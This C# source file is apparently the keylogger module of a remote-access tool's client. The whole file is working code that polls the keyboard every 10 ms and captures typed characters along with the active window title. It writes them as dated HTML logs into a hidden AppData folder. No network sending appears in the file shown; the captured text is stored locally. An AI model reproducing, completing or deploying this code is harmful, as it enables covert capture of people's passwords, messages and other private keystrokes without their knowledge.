using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    public class Logger
    {
        #region "WIN32API"

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int ToUnicodeEx(int wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff,
            int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetKeyboardLayout(uint threadId);

        #endregion

        public static Logger Instance;

        public bool Enabled
        {
            get { return _timerLogKeys.Enabled && _timerFlush.Enabled; }
            set
            {
                _timerLogKeys.Enabled = _timerFlush.Enabled = value;
                _timerLogKeys.Start();
            }
        }

        private static bool ShiftKey
        {
            get
            {
                return Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000); //Returns true if shiftkey is pressed
            }
        }

        private static bool CapsLock
        {
            get
            {
                return Control.IsKeyLocked(Keys.CapsLock); //Returns true if Capslock is toggled on
            }
        }

        private StringBuilder _keyBuffer_;
        private StringBuilder _keyBuffer { get { return _keyBuffer_ ?? new StringBuilder(); } set { _keyBuffer_ = value; } }
        private string _hWndTitle;
        private string _hWndLastTitle;

        private readonly string _filePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                                            "\\Logs\\";

        private readonly List<int> _enumValues;
        private IntPtr _activeKeyboardLayout;
        private readonly System.Timers.Timer _timerLogKeys;
        private readonly System.Timers.Timer _timerFlush;

        public Logger(double flushInterval)
        {
            Instance = this;
            _hWndLastTitle = string.Empty;

            WriteFile();

            _enumValues = new List<int>()
                //Populate enumValues list with the Virtual Key Codes of the keys we want to log
            {
                8, //Backspace
                9, //Tab
                13, //Enter
                32, //Space
                46, //Delete
            };

            for (int i = 48; i <= 57; i++) //0-9 regular
            {
                _enumValues.Add(i);
            }

            for (int i = 65; i <= 122; i++)
                //65-90 are the key codes for A-Z, skip 91-94 which are LWin + RWin keys, Applications and sleep key, 95-111 numpad keys, 112-122 are F1-F11 keys
            {
                if (i >= 91 && i <= 94)
                    continue;

                _enumValues.Add(i);
            }

            for (int i = 186; i <= 192; i++)
                //186 VK_OEM_1, 187 VK_OEM_PLUS, 188 VK_OEM_COMMA, 189 VK_OEM_MINUS, 190 VK_OEM_PERIOD, 191 VK_OEM_2, 192 VK_OEM_3
            {
                _enumValues.Add(i);
            }

            for (int i = 219; i <= 222; i++) //219 VK_OEM_4, 220 VK_OEM_5, 221 VK_OEM_6, 222 VK_OEM_7
            {
                _enumValues.Add(i);
            }

            this._timerLogKeys = new System.Timers.Timer {Enabled = false, Interval = 10};
            this._timerLogKeys.Elapsed += this.timerLogKeys_Elapsed;

            this._timerFlush = new System.Timers.Timer {Enabled = false, Interval = flushInterval};
            this._timerFlush.Elapsed += this.timerFlush_Elapsed;
        }

        private void timerLogKeys_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            _hWndTitle = GetActiveWindowTitle(); //Get active thread window title

            _activeKeyboardLayout = GetActiveKeyboardLayout(); //Get active thread keyboard layout

            foreach (int i in _enumValues) //Loop through our enumValues list populated with the keys we want to log
            {
                if (GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                {
                    if (_hWndTitle != null)
                    {
                        if (_hWndTitle != _hWndLastTitle)
                            //Only write title to log if a key is pressed that we support in our enumValues list, we don't want to write the title to a log with blank characters to follow
                        {
                            _hWndLastTitle = _hWndTitle;

                            _keyBuffer.Append("<br><br>[<b>" + _hWndTitle + "</b>]<br>");
                        }
                    }

                    switch (i)
                    {
                        case 8:
                            _keyBuffer.Append("<font color=\"0000FF\">[Back]</font>");
                            return;
                        case 9:
                            _keyBuffer.Append("<font color=\"0000FF\">[Tab]</font>");
                            return;
                        case 13:
                            _keyBuffer.Append("<font color=\"0000FF\">[Enter]</font><br>");
                            return;
                        case 32:
                            _keyBuffer.Append(" ");
                            return;
                        case 46:
                            _keyBuffer.Append("<font color=\"0000FF\">[Del]</font>");
                            return;
                    }

                    if (_enumValues.Contains(i)) //If our enumValues list contains to current key pressed
                    {
                        _keyBuffer.Append(FromKeys(i, ShiftKey, CapsLock));

                        return;
                    }
                }
            }
        }

        private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (_keyBuffer.Length > 0)
                WriteFile();
        }

        private void WriteFile()
        {
            bool writeHeader = false;

            string fileName = _filePath + DateTime.Now.ToString("MM-dd-yyyy");

            try
            {
                if (!Directory.Exists(_filePath))
                    Directory.CreateDirectory(_filePath);

                if (!File.Exists(fileName))
                    writeHeader = true;

                using (FileStream fileStream = new FileStream(fileName, FileMode.Append, FileAccess.Write))
                {
                    using (StreamWriter sw = new StreamWriter(fileStream))
                    {
                        try
                        {
                            if (writeHeader)
                            {
                                sw.Write(
                                    "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on " +
                                    DateTime.Now.ToString("dd.MM.yyyy HH:mm") + "<br>");

                                if (_keyBuffer.Length > 0)
                                    sw.Write(_keyBuffer);

                                _hWndLastTitle = string.Empty;
                            }
                            else
                                sw.Write(_keyBuffer);
                        }
                        catch
                        {
                        }
                    }
                }
            }
            catch
            {
            }

            _keyBuffer = new StringBuilder();
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            GetWindowText(GetForegroundWindow(), sbTitle, sbTitle.Capacity);

            string title = sbTitle.ToString();

            return title != string.Empty ? title : null;
        }

        private IntPtr GetActiveKeyboardLayout()
        {
            uint pid;
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out pid));
        }

        private char? FromKeys(int keys, bool shift, bool caps)
        {
            var keyStates = new byte[256];
                //keyStates is a byte array that specifies the current state of the keyboard and keys
            //The keys we are interested in are modifier keys such as shift and caps lock
            if (shift)
                keyStates[16] = 0x80;
                    //keyStates[16] tells our ToUnicodeEx method the state of the shift key which is 0x80 (Key pressed down)
            if (caps)
                keyStates[20] = 0x01;
                    //keyStates[20] tells our ToUnicodeEx method the state of the Capslock key which is 0x01 (Key toggled on)

            var sb = new StringBuilder(10);

            return ToUnicodeEx(keys, 0, keyStates, sb, sb.Capacity, 0, _activeKeyboardLayout) == 1
                ? (char?) sb[0]
                : null;
                //Get the appropriate unicode character from the state of keyboard and from the Keyboard layout (language) of the active thread
        }
    }
}